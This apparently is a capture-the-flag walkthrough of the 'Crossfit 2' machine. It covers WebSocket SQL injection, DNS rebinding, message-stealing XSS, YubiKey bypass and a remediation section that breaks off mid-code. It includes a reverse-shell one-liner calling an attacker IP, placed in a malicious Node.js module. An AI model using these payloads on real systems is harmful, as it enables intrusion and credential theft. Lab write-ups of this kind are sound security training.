<!doctype html><html lang=en><head><title>Crossfit 2 HTB - Insane OpenBSD Box Walkthrough :: VAPT Walkthroughs</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="Complete walkthrough of Crossfit 2 HTB machine featuring WebSocket SQL injection, DNS rebinding attacks, XSS exploitation, Node.js module injection, SUID binary abuse, and YubiKey authentication bypass"><meta name=keywords content><meta name=robots content="noodp"><link rel=canonical href=https://malayamanas.github.io/posts/crossfit2-htb-walkthrough/><link rel=stylesheet href=https://malayamanas.github.io/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css><link rel=stylesheet href=https://malayamanas.github.io/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css><link rel=stylesheet href=https://malayamanas.github.io/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css><link rel=stylesheet href=https://malayamanas.github.io/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css><link rel=stylesheet href=https://malayamanas.github.io/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css><link rel=stylesheet href=https://malayamanas.github.io/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css><link rel=stylesheet href=https://malayamanas.github.io/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css><link rel=stylesheet href=https://malayamanas.github.io/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css><link rel=stylesheet href=https://malayamanas.github.io/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css><link rel=stylesheet href=https://malayamanas.github.io/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css><link rel=stylesheet href=https://malayamanas.github.io/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css><link rel=stylesheet href=https://malayamanas.github.io/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css><link rel=stylesheet href=https://malayamanas.github.io/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css><link rel=stylesheet href=https://malayamanas.github.io/terminal.css><link rel="shortcut icon" href=https://malayamanas.github.io/favicon.png><link rel=apple-touch-icon href=https://malayamanas.github.io/apple-touch-icon.png><meta name=twitter:card content="summary"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Crossfit 2 HTB - Insane OpenBSD Box Walkthrough"><meta property="og:description" content="Complete walkthrough of Crossfit 2 HTB machine featuring WebSocket SQL injection, DNS rebinding attacks, XSS exploitation, Node.js module injection, SUID binary abuse, and YubiKey authentication bypass"><meta property="og:url" content="https://malayamanas.github.io/posts/crossfit2-htb-walkthrough/"><meta property="og:site_name" content="VAPT Walkthroughs"><meta property="og:image" content="https://malayamanas.github.io/og-image.png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="627"><meta property="article:section" content="HTB"><meta property="article:section" content="OpenBSD"><meta property="article:published_time" content="2025-09-22 06:45:00 +0000 UTC"></head><body><div class=container><header class=header><div class=header__inner><div class=header__logo><a href=https://malayamanas.github.io/><div class=logo>Terminal</div></a></div><ul class="menu menu--mobile"><li class=menu__trigger>Menu&nbsp;â–¾</li><li><ul class=menu__dropdown><li><a href=/>Home</a></li><li><a href=/search>Search</a></li><li><a href=/tags>Tags</a></li><li><a href=/difficulty>Difficulty</a></li></ul></li></ul></div><nav class=navigation-menu><ul class="navigation-menu__inner menu--desktop"><li><a href=/>Home</a></li><li><a href=/search>Search</a></li><li><a href=/tags>Tags</a></li><li><a href=/difficulty>Difficulty</a></li></ul></nav></header><div class=content><article class=post><h1 class=post-title><a href=https://malayamanas.github.io/posts/crossfit2-htb-walkthrough/>Crossfit 2 HTB - Insane OpenBSD Box Walkthrough</a></h1><div class=post-meta><time class=post-date>2025-09-22</time></div><span class=post-tags>#<a href=https://malayamanas.github.io/tags/insane-openbsd/>insane-openbsd</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/web/>web</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/sql-injection/>sql-injection</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/websocket/>websocket</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/xss/>xss</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/dns-rebinding/>dns-rebinding</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/cors-bypass/>cors-bypass</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/nodejs/>nodejs</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/yubikey/>yubikey</a>&nbsp;
#<a href=https://malayamanas.github.io/tags/privilege-escalation/>privilege-escalation</a>&nbsp;</span><div class=post-content><div><h1 id=crossfit-2-htb---insane-openbsd-box-walkthrough>Crossfit 2 HTB - Insane OpenBSD Box Walkthrough<a href=#crossfit-2-htb---insane-openbsd-box-walkthrough class=hanchor arialabel=Anchor>#</a></h1><div style=position:relative;padding-bottom:56.25%;height:0;overflow:hidden><iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading=eager referrerpolicy=strict-origin-when-cross-origin src="https://www.youtube.com/embed/OUjdPa11tGw?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style=position:absolute;top:0;left:0;width:100%;height:100%;border:0 title="YouTube video"></iframe></div><p>Below is a chronological extraction of the key exploitation steps and techniques used in the &ldquo;Crossfit 2&rdquo; Hack The Box challenge, as described in the provided data. The steps are organized in the order they were performed, focusing on the critical actions and techniques that advanced the exploitation process.</p><hr><h2 id=key-exploitation-steps-and-techniques-chronological-order>Key Exploitation Steps and Techniques (Chronological Order)<a href=#key-exploitation-steps-and-techniques-chronological-order class=hanchor arialabel=Anchor>#</a></h2><h3 id=1-initial-reconnaissance-with-nmap>1. <strong>Initial Reconnaissance with Nmap</strong><a href=#1-initial-reconnaissance-with-nmap class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Port scanning and service enumeration</li><li><strong>Description</strong>: Performed an Nmap scan (<code>nmap -sC -sV -oA nmap/crossfit2 [TARGET-IP]</code>) to identify open ports and services. Discovered:<ul><li>Port 22 (SSH) running OpenSSH 8.4, with no additional distro information.</li><li>Port 80 (HTTP) running PHP 7.4.12, indicating a PHP web server on an OpenBSD system.</li></ul></li><li><strong>Purpose</strong>: Identified the attack surface, confirming a web server and SSH as primary targets.</li></ul><h3 id=2-web-server-enumeration-and-fingerprinting>2. <strong>Web Server Enumeration and Fingerprinting</strong><a href=#2-web-server-enumeration-and-fingerprinting class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Manual web browsing and HTTP header analysis</li><li><strong>Description</strong>: Accessed the web server at <code>[TARGET-IP]</code> and identified:<ul><li>A Crossfit-themed website with a hostname leak (<code>gym.crossfit.htb</code>) via WebSocket errors in the browser console.</li><li>The server runs on OpenBSD (from <code>X-Powered-By</code> header) and uses PHP, with paths differing from Linux-based systems.</li><li>Added <code>crossfit.htb</code> and <code>gym.crossfit.htb</code> to <code>/etc/hosts</code> for further exploration.</li></ul></li><li><strong>Purpose</strong>: Gathered initial web server details and subdomains for targeted attacks.</li></ul><h3 id=3-directory-and-subdomain-enumeration>3. <strong>Directory and Subdomain Enumeration</strong><a href=#3-directory-and-subdomain-enumeration class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Directory brute-forcing with Gobuster and subdomain discovery</li><li><strong>Description</strong>:<ul><li>Ran Gobuster (<code>gobuster dir -u http://[TARGET-IP] -w /opt/seclists/discovery/web-content/raft-small-words.php -x php -o gobuster_root.log</code>) to enumerate directories and PHP scripts.</li><li>Discovered additional subdomain <code>employees.crossfit.htb</code> via the website&rsquo;s contact form and WebSocket interactions, added to <code>/etc/hosts</code>.</li><li>Conducted a full port scan (<code>nmap -p- -v -oA nmap/crossfit-all-ports [TARGET-IP]</code>) to uncover hidden services.</li></ul></li><li><strong>Purpose</strong>: Expanded the attack surface by identifying additional endpoints and subdomains.</li></ul><h3 id=4-sql-injection-via-websocket>4. <strong>SQL Injection via WebSocket</strong><a href=#4-sql-injection-via-websocket class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: SQL injection over WebSocket</li><li><strong>Description</strong>:<ul><li>Identified a WebSocket endpoint at <code>gym.crossfit.htb/websocket</code> and intercepted messages using Burp Suite.</li><li>Tested for SQL injection by manipulating the <code>params</code> field in WebSocket messages (e.g., <code>message: {available: {params: "1'"}, token: "&lt;token>"}</code>).</li><li>Confirmed injection with <code>3 UNION SELECT 1,2</code>, revealing the query structure.</li><li>Developed a Python script using the <code>websocket</code> and <code>cmd</code> libraries to automate SQL injection, extracting:<ul><li>Database names: <code>information_schema</code>, <code>crossfit</code>, <code>employees</code>.</li><li>Tables: <code>crossfit.membership_plans</code>, <code>employees.employees</code>, <code>employees.password_reset</code>.</li><li>Columns from <code>employees.employees</code>: <code>id</code>, <code>username</code>, <code>email</code>, <code>password</code> (hashed), revealing admin user <code>david.palmer@crossfit.htb</code>.</li></ul></li></ul></li><li><strong>Purpose</strong>: Extracted sensitive data (usernames, emails, hashed passwords) to target the administrator account.</li></ul><h3 id=5-dns-rebinding-for-host-header-manipulation>5. <strong>DNS Rebinding for Host Header Manipulation</strong><a href=#5-dns-rebinding-for-host-header-manipulation class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: DNS rebinding attack</li><li><strong>Description</strong>:<ul><li>Discovered port 8953 running Unbound DNS control via the full port scan.</li><li>Used SQL injection to read Unbound configuration files (<code>/var/unbound/etc/unbound.conf</code>, <code>server.pem</code>, <code>control.key</code>, <code>control.pem</code>) to gain control over the DNS server.</li><li>Configured a local Unbound instance to add a malicious DNS entry (<code>ipsec-employees.crossfit.htb</code> pointing to <code>127.0.0.1</code> initially, then <code>[ATTACKER-IP]</code>).</li><li>Set up a fake DNS server using <code>fake-dns</code> with a rebinding configuration to bypass the <code>localhost</code> restriction in the password reset functionality.</li><li>Sent a password reset request for <code>david.palmer@crossfit.htb</code> with a manipulated <code>Host</code> header (<code>ipsec-employees.crossfit.htb</code>) to redirect the reset link to the attacker&rsquo;s server.</li></ul></li><li><strong>Purpose</strong>: Bypassed the <code>localhost</code> restriction to deliver a malicious link to the administrator.</li></ul><h3 id=6-cross-site-scripting-xss-for-account-creation>6. <strong>Cross-Site Scripting (XSS) for Account Creation</strong><a href=#6-cross-site-scripting-xss-for-account-creation class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Reflected XSS with CORS bypass</li><li><strong>Description</strong>:<ul><li>Identified a new domain <code>crossfit-club.htb</code> via <code>relayd.conf</code> and accessed its portal, which had a signup endpoint (<code>/api/signup</code>) restricted to administrators.</li><li>Crafted an XSS payload in <code>password_reset.php</code> to:<ul><li>Fetch a CSRF token from <code>/api/auth</code>.</li><li>Send a POST request to <code>/api/signup</code> with the token to register an account (<code>username: ipsec, password: pleasesubscribe, email: root@ipsec.rocks</code>).</li><li>Bypassed CORS restrictions by registering a domain (<code>jimx.crossfit.htb</code>) exploiting a wildcard vulnerability in the CORS policy.</li></ul></li><li>Delivered the XSS payload via the DNS rebinding attack, tricking the administrator into executing it, creating the account <code>ipsec</code>.</li></ul></li><li><strong>Purpose</strong>: Gained access to the <code>crossfit-club.htb</code> portal with a new user account.</li></ul><h3 id=7-xss-to-eavesdrop-on-private-messages>7. <strong>XSS to Eavesdrop on Private Messages</strong><a href=#7-xss-to-eavesdrop-on-private-messages class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Persistent XSS via WebSocket</li><li><strong>Description</strong>:<ul><li>Logged into <code>crossfit-club.htb</code> with the <code>ipsec</code> account and identified a chat feature using Socket.IO.</li><li>Used Wireshark to analyze WebSocket traffic and identified the <code>private_receive</code> event for private messages.</li><li>Crafted a new XSS payload in <code>password_reset.php</code> to:<ul><li>Connect to <code>crossfit-club.htb/socket.io</code>, emit a <code>user_join</code> event as <code>admin</code> (David Palmer), and hook <code>private_receive</code> to capture private messages.</li><li>Forward captured messages to the attacker&rsquo;s server (<code>[ATTACKER-IP]</code>) in Base64-encoded format.</li></ul></li><li>Delivered the payload via the DNS rebinding attack, capturing a private message containing David Palmer&rsquo;s SSH password.</li></ul></li><li><strong>Purpose</strong>: Obtained the SSH password for the <code>david</code> user by intercepting private messages.</li></ul><h3 id=8-ssh-login-as-david>8. <strong>SSH Login as David</strong><a href=#8-ssh-login-as-david class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Credential-based SSH authentication</li><li><strong>Description</strong>: Used the stolen password to log into SSH as <code>david@[TARGET-IP]</code>, switching to a <code>sh</code> shell for familiarity (as OpenBSD uses <code>csh</code> by default).</li><li><strong>Purpose</strong>: Gained initial shell access as the <code>david</code> user.</li></ul><h3 id=9-privilege-escalation-via-nodejs-module-injection>9. <strong>Privilege Escalation via Node.js Module Injection</strong><a href=#9-privilege-escalation-via-nodejs-module-injection class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: Node.js module path manipulation</li><li><strong>Description</strong>:<ul><li>Identified the <code>david</code> user as part of the <code>sysadmins</code> group and found a writable directory (<code>/opt/sysadmin</code>) containing <code>statbot.js</code>.</li><li>Noticed <code>statbot.js</code> loads the <code>ws</code> (WebSocket) module but lacks a local <code>node_modules</code> directory.</li><li>Exploited Node.js module resolution by creating <code>/opt/sysadmin/node_modules/ws/index.js</code> with a reverse shell payload (<code>require('child_process').execSync('nc [ATTACKER-IP] 9001 -e /bin/sh')</code>).</li><li>Waited for <code>statbot.js</code> (executed periodically) to load the malicious module, resulting in a reverse shell as the <code>john</code> user (part of <code>sysadmins</code> and <code>staff</code> groups).</li></ul></li><li><strong>Purpose</strong>: Escalated privileges to the <code>john</code> user via a malicious Node.js module.</li></ul><h3 id=10-privilege-escalation-via-suid-binary>10. <strong>Privilege Escalation via SUID Binary</strong><a href=#10-privilege-escalation-via-suid-binary class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: SUID binary exploitation</li><li><strong>Description</strong>:<ul><li>Identified a setuid binary (<code>/usr/local/bin/log</code>) owned by the <code>staff</code> group, executable by the <code>john</code> user.</li><li>Analyzed the binary using Ghidra and Cutter, discovering it uses the <code>unveil</code> syscall to restrict file access to <code>/var</code>.</li><li>Found that <code>/var/backups</code> contains SSH key backups (e.g., <code>root.ssh_id_rsa</code>) due to OpenBSD&rsquo;s backup system replacing slashes with underscores.</li><li>Used the <code>log</code> binary to read <code>/var/backups/root.ssh_id_rsa.current</code>, extracting the root SSH private key.</li></ul></li><li><strong>Purpose</strong>: Obtained the root SSH private key for further authentication.</li></ul><h3 id=11-yubikey-authentication-bypass>11. <strong>YubiKey Authentication Bypass</strong><a href=#11-yubikey-authentication-bypass class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Technique</strong>: YubiKey secret extraction and simulation</li><li><strong>Description</strong>:<ul><li>Attempted SSH login as <code>root@[TARGET-IP]</code> with the stolen private key, but it required YubiKey authentication (<code>publickey,password</code> in <code>/etc/ssh/sshd_config</code>).</li><li>Used the <code>log</code> binary to extract YubiKey secrets (<code>/var/db/yubikey/root.uid</code>, <code>root.key</code>, <code>root.ctr</code>).</li><li>Configured a YubiKey simulator (<code>yubico-c</code> or <code>ubsim</code>) with the extracted secrets, incrementing the counter (<code>root.ctr</code> + 1) to generate a valid one-time password.</li><li>Successfully logged into SSH as <code>root</code> using the private key and generated YubiKey password.</li></ul></li><li><strong>Purpose</strong>: Achieved root access by bypassing two-factor authentication.</li></ul><hr><h2 id=summary-of-techniques>Summary of Techniques<a href=#summary-of-techniques class=hanchor arialabel=Anchor>#</a></h2><ul><li><strong>Reconnaissance</strong>: Nmap, Gobuster, manual web enumeration.</li><li><strong>Web Exploitation</strong>: SQL injection (WebSocket), XSS (reflected and persistent), CORS bypass, DNS rebinding.</li><li><strong>Credential Harvesting</strong>: Extracted admin credentials via SQL injection and private message interception.</li><li><strong>Privilege Escalation</strong>: Node.js module injection, SUID binary exploitation.</li><li><strong>Authentication Bypass</strong>: YubiKey secret extraction and simulation.</li></ul><p>This sequence reflects the progression from initial reconnaissance to root access, leveraging a combination of web vulnerabilities, system misconfigurations, and authentication bypass techniques.</p><h2 id=security-gaps-and-remediation>Security Gaps and Remediation<a href=#security-gaps-and-remediation class=hanchor arialabel=Anchor>#</a></h2><p>Below is a detailed analysis of the security gaps identified in the &ldquo;Crossfit 2&rdquo; Hack The Box challenge, organized by service or system, along with specific recommendations for fixing each vulnerability through proper source code or configuration changes. These gaps are derived from the exploitation steps provided in the data, and the fixes aim to address the root causes to prevent similar attacks.</p><hr><h3 id=1-web-server-php-on-openbsd-port-80>1. <strong>Web Server (PHP on OpenBSD, Port 80)</strong><a href=#1-web-server-php-on-openbsd-port-80 class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Gap</strong>: SQL Injection in WebSocket Endpoint (<code>gym.crossfit.htb/websocket</code>)<ul><li><strong>Description</strong>: The WebSocket endpoint accepts a <code>params</code> parameter that is vulnerable to SQL injection, allowing attackers to extract database information (e.g., usernames, emails, hashed passwords) via queries like <code>3 UNION SELECT 1,2</code>.</li><li><strong>Impact</strong>: Unauthorized access to sensitive data in the <code>crossfit</code> and <code>employees</code> databases.</li><li><strong>Fix</strong>:<ul><li><strong>Source Code Fix</strong>: Implement parameterized queries or prepared statements in the PHP code handling WebSocket inputs. For example, use PDO with prepared statements to sanitize the <code>params</code> input:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$stmt <span style=color:#f92672>=</span> $pdo<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>prepare</span>(<span style=color:#e6db74>&#34;SELECT * FROM membership_plans WHERE id = ?&#34;</span>);
</span></span><span style=display:flex><span>$stmt<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>execute</span>([$params]);
</span></span></code></pre></div></li><li><strong>Configuration Fix</strong>: Deploy a Web Application Firewall (WAF) to detect and block SQL injection patterns in WebSocket traffic. Configure the WAF to filter inputs containing SQL keywords (e.g., <code>UNION</code>, <code>SELECT</code>).</li></ul></li></ul></li><li><strong>Gap</strong>: File Read Access via SQL Injection (<code>LOAD_FILE</code>)<ul><li><strong>Description</strong>: The database user has the <code>FILE</code> privilege, allowing attackers to read system files (e.g., <code>/etc/passwd</code>, <code>/var/unbound/etc/unbound.conf</code>) using <code>LOAD_FILE</code> in SQL queries.</li><li><strong>Impact</strong>: Exposure of sensitive system configuration files, enabling further attacks like DNS rebinding.</li><li><strong>Fix</strong>:<ul><li><strong>Configuration Fix</strong>: Revoke the <code>FILE</code> privilege from the database user to prevent file access. Run:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>REVOKE</span> FILE <span style=color:#66d9ef>ON</span> <span style=color:#f92672>*</span>.<span style=color:#f92672>*</span> <span style=color:#66d9ef>FROM</span> <span style=color:#e6db74>&#39;crossfit&#39;</span><span style=color:#f92672>@</span><span style=color:#e6db74>&#39;localhost&#39;</span>;
</span></span></code></pre></div></li><li><strong>Source Code Fix</strong>: Validate and restrict SQL queries to prevent file access functions like <code>LOAD_FILE</code>. Use a database abstraction layer that disallows file operations.</li></ul></li></ul></li><li><strong>Gap</strong>: Hostname Leak in WebSocket Error<ul><li><strong>Description</strong>: The browser console revealed the subdomain <code>gym.crossfit.htb</code> via a WebSocket connection error, aiding subdomain enumeration.</li><li><strong>Impact</strong>: Attackers can discover hidden subdomains, expanding the attack surface.</li><li><strong>Fix</strong>:<ul><li><strong>Source Code Fix</strong>: Ensure error messages do not leak sensitive information like hostnames. Modify the WebSocket client code to handle errors generically:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>websocket</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>WebSocket</span>(<span style=color:#e6db74>&#39;ws://gym.crossfit.htb/websocket&#39;</span>);
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>e</span>) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>error</span>(<span style=color:#e6db74>&#39;WebSocket connection failed&#39;</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div></li><li><strong>Configuration Fix</strong>: Configure the web server to suppress detailed error messages in production. For Apache, set:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-apache data-lang=apache><span style=display:flex><span>ServerTokens Prod
</span></span><span style=display:flex><span>ServerSignature <span style=color:#66d9ef>Off</span>
</span></span></code></pre></div></li></ul></li></ul></li></ul><hr><h3 id=2-web-application-crossfit-clubhtb>2. <strong>Web Application (crossfit-club.htb)</strong><a href=#2-web-application-crossfit-clubhtb class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Gap</strong>: Cross-Site Scripting (XSS) via Password Reset Link<ul><li><strong>Description</strong>: The password reset functionality allows attackers to deliver malicious JavaScript via a crafted <code>Host</code> header, exploiting the lack of input validation and enabling XSS payloads to register accounts or intercept private messages.</li><li><strong>Impact</strong>: Attackers can execute arbitrary JavaScript in the administrator&rsquo;s browser, leading to account creation and data theft.</li><li><strong>Fix</strong>:<ul><li><strong>Source Code Fix</strong>: Sanitize and validate all user inputs in the password reset functionality. Use a library like <code>DOMPurify</code> to clean HTML/JavaScript from inputs:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>DOMPurify</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;dompurify&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>cleanInput</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>DOMPurify</span>.<span style=color:#a6e22e>sanitize</span>(<span style=color:#a6e22e>userInput</span>);
</span></span></code></pre></div></li><li><strong>Configuration Fix</strong>: Implement a Content Security Policy (CSP) to restrict script execution. For example:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>meta</span> <span style=color:#a6e22e>http-equiv</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Content-Security-Policy&#34;</span> <span style=color:#a6e22e>content</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;script-src &#39;self&#39;;&#34;</span>&gt;
</span></span></code></pre></div></li></ul></li></ul></li><li><strong>Gap</strong>: Weak CORS Policy with Wildcard Vulnerability<ul><li><strong>Description</strong>: The CORS policy allows subdomains like <code>jimx.crossfit.htb</code> due to improper regex validation, enabling attackers to bypass CORS restrictions.</li><li><strong>Impact</strong>: Attackers can make cross-origin requests to sensitive endpoints like <code>/api/auth</code> and <code>/api/signup</code>.</li><li><strong>Fix</strong>:<ul><li><strong>Source Code Fix</strong>: Validate the <code>Origin</code> header explicitly against a whitelist of allowed domains, ensuring proper regex escaping:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>allowedOrigins</span> <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;https://crossfit-club.htb&#39;</span>, <span style=color:#e6db74>&#39;https://employees.crossfit.htb&#39;</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>allowedOrigins</span>.<span style=color:#a6e22e>includes</span>(<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>headers</span>.<span style=color:#a6e22e>origin</span>)) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>setHeader</span>(<span style=color:#e6db74>&#39;Access-Control-Allow-Origin&#39;</span>, <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>headers</span>.<span style=color:#a6e22e>origin</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div></li><li><strong>Configuration Fix</strong>: Configure the web server (e.g., Nginx) to enforce strict CORS policies:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nginx data-lang=nginx><span style=display:flex><span><span style=color:#66d9ef>add_header</span> <span style=color:#e6db74>Access-Control-Allow-Origin</span> <span style=color:#e6db74>&#34;https://crossfit-club.htb&#34;</span> <span style=color:#e6db74>always</span>;
</span></span></code></pre></div></li></ul></li></ul></li><li><strong>Gap</strong>: Insufficient CSRF Token Validation<ul><li><strong>Description</strong>: The <code>/api/signup</code> endpoint accepts CSRF tokens that are not properly validated, allowing attackers to reuse tokens across requests.</li><li><strong>Impact</strong>: Attackers can perform unauthorized actions (e.g., account creation) via XSS.</li><li><strong>Fix</strong>:<ul><li><strong>Source Code Fix</strong>: Implement strict CSRF token validation with per-session, time-limited tokens. Use a framework like Express with <code>csurf</code>:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>csurf</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;csurf&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>use</span>(<span style=color:#a6e22e>csurf</span>());
</span></span></code></pre></div></li><li><strong>Configuration Fix</strong>: Ensure CSRF tokens are tied to user sessions and expire after a short period (e.g., 15 minutes).</li></ul></li></ul></li></ul><hr><h3 id=3-dns-server-unbound-port-8953>3. <strong>DNS Server (Unbound, Port 8953)</strong><a href=#3-dns-server-unbound-port-8953 class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Gap</strong>: Exposed Unbound DNS Control Port<ul><li><strong>Description</strong>: Port 8953 runs Unbound DNS control, accessible remotely, allowing attackers to read configuration files and manipulate DNS entries.</li><li><strong>Impact</strong>: Enabled DNS rebinding attacks to bypass <code>localhost</code> restrictions in the password reset functionality.</li><li><strong>Fix</strong>:<ul><li><strong>Configuration Fix</strong>: Restrict Unbound control access to <code>localhost</code> by configuring <code>control-interface</code> in <code>/var/unbound/etc/unbound.conf</code>:<pre tabindex=0><code class=language-conf data-lang=conf>control-interface: 127.0.0.1
</code></pre></li><li><strong>Configuration Fix</strong>: Use a firewall (e.g., <code>pf</code> on OpenBSD) to block external access to port 8953:<pre tabindex=0><code class=language-pf data-lang=pf>block in on egress proto tcp from any to any port 8953
</code></pre></li></ul></li></ul></li><li><strong>Gap</strong>: Readable Configuration Files<ul><li><strong>Description</strong>: Sensitive Unbound configuration files (<code>server.pem</code>, <code>control.key</code>, <code>control.pem</code>) are readable via SQL injection, exposing DNS control credentials.</li><li><strong>Impact</strong>: Attackers can manipulate DNS entries to facilitate attacks like rebinding.</li><li><strong>Fix</strong>:<ul><li><strong>Configuration Fix</strong>: Restrict file permissions to <code>root</code> only:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>chmod <span style=color:#ae81ff>600</span> /var/unbound/etc/unbound.conf /var/unbound/etc/server.pem /var/unbound/etc/control.key /var/unbound/etc/control.pem
</span></span><span style=display:flex><span>chown root /var/unbound/etc/*
</span></span></code></pre></div></li><li><strong>Configuration Fix</strong>: Move sensitive files to a directory inaccessible to the database user, and ensure the database cannot read system files (see SQL <code>FILE</code> privilege fix above).</li></ul></li></ul></li></ul><hr><h3 id=4-chat-application-socketio-on-crossfit-clubhtb>4. <strong>Chat Application (Socket.IO on crossfit-club.htb)</strong><a href=#4-chat-application-socketio-on-crossfit-clubhtb class=hanchor arialabel=Anchor>#</a></h3><ul><li><strong>Gap</strong>: Lack of Input Validation in Chat Messages<ul><li><strong>Description</strong>: The chat application allows WebSocket messages to be sent without proper validation, enabling XSS payloads to hook private messages via the <code>private_receive</code> event.</li><li><strong>Impact</strong>: Attackers can intercept private messages, including sensitive credentials like SSH passwords.</li><li><strong>Fix</strong>:<ul><li><strong>Source Code Fix</strong>: Sanitize and validate all WebSocket message inputs to prevent script injection. For example, in Node.js with Socket.IO:<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-javascript data-lang=javascript><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>sanitizeHtml</span> <span style=color:#f92672>=</span> 